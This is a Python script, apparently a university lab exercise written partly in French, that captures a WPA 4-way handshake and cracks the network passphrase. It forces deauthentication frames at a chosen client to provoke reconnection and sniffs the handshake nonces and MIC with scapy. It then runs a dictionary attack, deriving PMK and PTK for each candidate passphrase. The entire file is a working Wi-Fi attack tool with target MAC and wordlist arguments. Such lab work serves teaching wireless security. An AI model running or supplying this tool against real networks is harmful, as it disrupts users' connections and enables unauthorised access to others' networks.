#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derivate WPA keys from passphrase and 4-way handshake info by sniffing the network

Sniffe le réseau pour intercepter un 4-way handshake WPA qui peut être provoqué par une désauthentification forcée de la
cible. Une fois les valeurs nécessaires récupérées, calcule le MIC en réalisant une attaque par dictionnaire sur la
passphrase afin de trouver la PMK. Si le MIC calculé est égal au MIC trouvé dans le fichier, la passphrase utilisée est
correcte.
"""

__author__ = "Alexandra Cerottini et Nicolas Ogi"

import argparse
from binascii import a2b_hex, b2a_hex

from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Deauth, Dot11Elt
from scapy.layers.eap import *

from pbkdf2 import *

# codes used to identify the 4-way handshake messages
FIRST_MSG_WPA = 0x008a
SECOND_MSG_WPA = 0x010a
LAST_MSG_WPA = 0x030a

APmac = b''
Clientmac = b''
ANonce = b''
SNonce = b''
mic_to_test = b''
last_packet = b''
ssid = ''


def deauth(Clientmac, APmac, iface="wlan0"):
    dot11 = Dot11(addr1=Clientmac, addr2=APmac, addr3=APmac)

    # stack the layers up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=4)  # reason : 4 = Due to inactivity

    # send 30 deauth frames every 0.1s
    print(f"\nSending deauthentication frames")
    sendp(packet, inter=0.1, count=30, loop=0, iface=iface, verbose=1)


def get_wpa_handshake(packet):
    global ANonce, SNonce, mic_to_test, last_packet, ssid

    # if the packet is part of the WPA 4-way handshake and the BSSID belongs to the AP
    if packet.haslayer(WPA_key) and packet[Dot11].addr3 == APmac:

        # we extract the nonce sent by the AP from the first handshake message
        if packet[WPA_key].key_info == FIRST_MSG_WPA and not ANonce:
            ANonce = packet[WPA_key].nonce
            print("First message of WPA handshake intercepted")
            print("\t- ANonce :", b2a_hex(ANonce))

        # we extract the nonce sent by the client from the second handshake message
        elif packet[WPA_key].key_info == SECOND_MSG_WPA and not SNonce:
            SNonce = packet[WPA_key].nonce
            print("\nSecond message of WPA handshake intercepted")
            print("\t- SNonce :", b2a_hex(SNonce))

        # we extract the MIC to test from the last handshake message
        elif packet[WPA_key].key_info == LAST_MSG_WPA and not mic_to_test:
            mic_to_test = packet[WPA_key].wpa_key_mic
            last_packet = packet
            print("\nLast message of WPA handshake intercepted")
            print("\t- MIC :", b2a_hex(mic_to_test))

    # we extract the SSID of the AP
    elif packet.haslayer(Dot11Beacon) and packet[Dot11].addr3 == APmac and not ssid:
        ssid = packet[Dot11Elt].info.decode()
        print("SSID :", ssid)


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="A python script to capture a WPA 4-way handshake and find the passphrase of the network")
    parser.add_argument("Clientmac", help="Target MAC address")
    parser.add_argument("APmac", help="BSSID of AP to which the target is authenticated")
    parser.add_argument("wordlist", help="Wordlist of passphrases")
    parser.add_argument("--deauth", dest="deauth_enabled", help="Activate deauthentication of the target",
                        action='store_true')
    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds), default is 10s", default=10)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")

    args = parser.parse_args()
    Clientmac = args.Clientmac
    APmac = args.APmac
    wordlist = args.wordlist
    deauth_enabled = args.deauth_enabled
    sniff_time = int(args.sniff_time)
    iface = args.iface

    # send deauth frames to target only if True
    if deauth_enabled:
        deauth(Clientmac, APmac, iface)

    # start sniffing
    print(f"\nWaiting {sniff_time}s for WPA 4-way handshake...")
    sniff(prn=get_wpa_handshake, iface=iface, timeout=sniff_time)

    APmac = a2b_hex(APmac.replace(':', ''))
    Clientmac = a2b_hex(Clientmac.replace(':', ''))

    # this string is used in the pseudo-random function
    A = "Pairwise key expansion"

    # used in pseudo-random function
    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)

    # set the MIC key to 0 before getting the data from the last message of the handshake
    last_packet[WPA_key].wpa_key_mic = 0
    data = bytes(last_packet[EAPOL])

    print("\n\nValues used to derivate keys")
    print("============================")
    print("SSID: ", ssid, "\n")
    print("AP Mac: ", b2a_hex(APmac), "\n")
    print("Client Mac: ", b2a_hex(Clientmac), "\n")
    print("AP Nonce: ", b2a_hex(ANonce), "\n")
    print("Client Nonce: ", b2a_hex(SNonce), "\n")

    passphrase_found = False

    # iterate on the wordlist to find the correct passphrase
    f = open(wordlist, 'r')
    for passPhrase in f.read().splitlines():
        passPhrase = str.encode(passPhrase)
        encoded_ssid = str.encode(ssid)

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase, encoded_ssid, 4096, 32)

        # expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16], data, hashlib.sha1)

        # the 4 last bytes must be removed of the MIC because SHA-1 returned 20 bytes but the MIC is only 16 bytes long
        if mic.hexdigest()[:-8] == mic_to_test.hex():
            passphrase_found = True
            print("\nPassphrase found ! \"" + passPhrase.decode() + "\"")
            print("\nResults of the key expansion")
            print("=============================")
            print("PMK:\t\t", pmk.hex(), "\n")
            print("PTK:\t\t", ptk.hex(), "\n")
            print("KCK:\t\t", ptk[0:16].hex(), "\n")
            print("KEK:\t\t", ptk[16:32].hex(), "\n")
            print("TK:\t\t", ptk[32:48].hex(), "\n")
            print("MICK:\t\t", ptk[48:64].hex(), "\n")
            print("MIC:\t\t", mic.hexdigest(), "\n")
            break

    if not passphrase_found:
        print("Passphrase not found")
